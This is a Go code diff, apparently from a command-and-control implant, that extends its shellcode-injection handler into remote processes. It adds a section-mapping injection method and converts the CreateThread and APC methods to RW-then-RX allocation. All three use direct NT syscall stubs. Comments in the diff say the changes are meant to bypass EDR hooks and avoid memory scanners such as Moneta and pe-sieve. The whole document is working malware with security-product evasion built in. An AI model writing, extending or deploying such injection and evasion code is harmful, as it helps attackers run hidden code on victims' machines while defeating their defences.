@@ -51,6 +51,8 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 		injectErr = injectSelf(sc)
 	case "apc":
 		injectErr = injectAPC(sc, pid)
+	case "mapsection":
+		injectErr = injectMapSection(sc, pid)
 	default:
 		injectErr = injectCreateThread(sc, pid)
 	}
@@ -67,10 +69,10 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 	})
 }
 
-// injectCreateThread allocates RWX memory in the target process and starts a
-// thread at the shellcode address. Both allocation and thread creation are
-// routed through direct NtAllocateVirtualMemory / NtCreateThreadEx syscall
-// stubs (bypasses EDR hooks on the kernel32/ntdll Win32 dispatch path).
+// injectCreateThread allocates memory in the target process, writes shellcode,
+// then flips the page to RX before starting the thread.  RW→RX flip avoids
+// an RWX private allocation that memory scanners (Moneta, pe-sieve, CS) alarm on.
+// All NT operations use direct syscall stubs (bypasses EDR hooks).
 func injectCreateThread(sc []byte, pid uint32) error {
 	proc, err := openTargetProcess(pid)
 	if err != nil {
@@ -78,13 +80,17 @@ func injectCreateThread(sc []byte, pid uint32) error {
 	}
 	defer windows.CloseHandle(proc)
 
-	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
+	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_READWRITE)
 	if addr == 0 {
 		return fmt.Errorf("NtAllocateVirtualMemory failed")
 	}
-
-	evasion.NtWriteRemote(uintptr(proc), addr, sc)
-
+	if !evasion.NtWriteRemote(uintptr(proc), addr, sc) {
+		return fmt.Errorf("NtWriteRemote failed")
+	}
+	// Flip to RX — no executable allocation while writing.
+	if !evasion.NtProtectRemote(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ) {
+		return fmt.Errorf("NtProtectRemote failed")
+	}
 	th := evasion.NtCreateThreadEx(uintptr(proc), addr)
 	if th == 0 {
 		return fmt.Errorf("NtCreateThreadEx failed")
@@ -93,9 +99,10 @@ func injectCreateThread(sc []byte, pid uint32) error {
 	return nil
 }
 
-// injectAPC queues a user-mode APC to all alertable threads of the target
-// process. At least one thread must be in an alertable wait state for the APC
-// to fire.
+// injectAPC allocates RW memory, writes shellcode, flips to RX, then queues an
+// APC to every thread of the target process via direct NtQueueApcThread syscall
+// stubs.  Thread enumeration uses NtGetNextThread (no Toolhelp32 snapshot).
+// At least one thread must be in an alertable wait state for the APC to fire.
 func injectAPC(sc []byte, pid uint32) error {
 	proc, err := openTargetProcess(pid)
 	if err != nil {
@@ -103,52 +110,83 @@ func injectAPC(sc []byte, pid uint32) error {
 	}
 	defer windows.CloseHandle(proc)
 
-	k32 := windows.NewLazySystemDLL("kernel32.dll")
-	virtualAllocEx := k32.NewProc("VirtualAllocEx")
-	writeProcessMemory := k32.NewProc("WriteProcessMemory")
-	queueUserAPC := k32.NewProc("QueueUserAPC")
-
-	const memCommitReserve = 0x3000
-	const pageExecReadWrite = 0x40
-
-	addr, _, _ := virtualAllocEx.Call(
-		uintptr(proc), 0, uintptr(len(sc)),
-		memCommitReserve, pageExecReadWrite,
-	)
+	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_READWRITE)
 	if addr == 0 {
-		return fmt.Errorf("VirtualAllocEx failed")
+		return fmt.Errorf("NtAllocateVirtualMemory failed")
 	}
-	writeProcessMemory.Call(uintptr(proc), addr,
-		uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
-
-	// Enumerate threads of the target process and queue APC to each.
-	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
-	if err != nil {
-		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
+	if !evasion.NtWriteRemote(uintptr(proc), addr, sc) {
+		return fmt.Errorf("NtWriteRemote failed")
 	}
-	defer windows.CloseHandle(snap)
+	if !evasion.NtProtectRemote(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ) {
+		return fmt.Errorf("NtProtectRemote failed")
+	}
 
-	var te windows.ThreadEntry32
-	te.Size = uint32(unsafe.Sizeof(te))
+	// Enumerate threads via NtGetNextThread — no kernel32 Toolhelp32 snapshot.
+	const threadSetContext = 0x0010
 	queued := 0
-	if windows.Thread32First(snap, &te) == nil {
-		for {
-			if te.OwnerProcessID == pid {
-				th, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, te.ThreadID)
-				if err == nil {
-					queueUserAPC.Call(addr, uintptr(th), 0)
-					windows.CloseHandle(th)
-					queued++
-				}
-			}
-			if windows.Thread32Next(snap, &te) != nil {
-				break
-			}
+	var th uintptr
+	for {
+		next := evasion.NtGetNextThread(uintptr(proc), th, threadSetContext)
+		if th != 0 {
+			windows.CloseHandle(windows.Handle(th))
 		}
+		if next == 0 {
+			break
+		}
+		th = next
+		evasion.NtQueueApcThread(th, addr, 0)
+		queued++
 	}
 	if queued == 0 {
 		return fmt.Errorf("no threads accessible in pid %d", pid)
 	}
+	return nil
+}
+
+// injectMapSection injects shellcode by creating a shared memory section and
+// mapping RW into our process to write, then RX into the target.  This avoids
+// any NtWriteVirtualMemory or NtAllocateVirtualMemory call in the target — the
+// only NT events visible to the target are MapViewOfSection and CreateThread.
+func injectMapSection(sc []byte, pid uint32) error {
+	if len(sc) == 0 {
+		return fmt.Errorf("empty shellcode")
+	}
+	proc, err := openTargetProcess(pid)
+	if err != nil {
+		return err
+	}
+	defer windows.CloseHandle(proc)
+
+	// Create a pagefile-backed section; max protection must cover both views.
+	hSection := evasion.NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_READWRITE)
+	if hSection == 0 {
+		return fmt.Errorf("NtCreateSection failed")
+	}
+	defer windows.CloseHandle(windows.Handle(hSection))
+
+	// Map RW into our process — write shellcode here (not visible in target).
+	const selfProc = ^uintptr(0)
+	var localBase uintptr
+	localSize := uintptr(len(sc))
+	if !evasion.NtMapViewOfSection(hSection, selfProc, &localBase, &localSize, windows.PAGE_READWRITE) {
+		return fmt.Errorf("NtMapViewOfSection (local) failed")
+	}
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(sc))
+	copy(dst, sc)
+	evasion.NtUnmapViewOfSection(selfProc, localBase)
+
+	// Map RX into target — no WriteVirtualMemory event in target's address space.
+	var remoteBase uintptr
+	remoteSize := uintptr(len(sc))
+	if !evasion.NtMapViewOfSection(hSection, uintptr(proc), &remoteBase, &remoteSize, windows.PAGE_EXECUTE_READ) {
+		return fmt.Errorf("NtMapViewOfSection (remote) failed")
+	}
+
+	th := evasion.NtCreateThreadEx(uintptr(proc), remoteBase)
+	if th == 0 {
+		return fmt.Errorf("NtCreateThreadEx failed")
+	}
+	windows.CloseHandle(windows.Handle(th))
 	return nil
 }
 
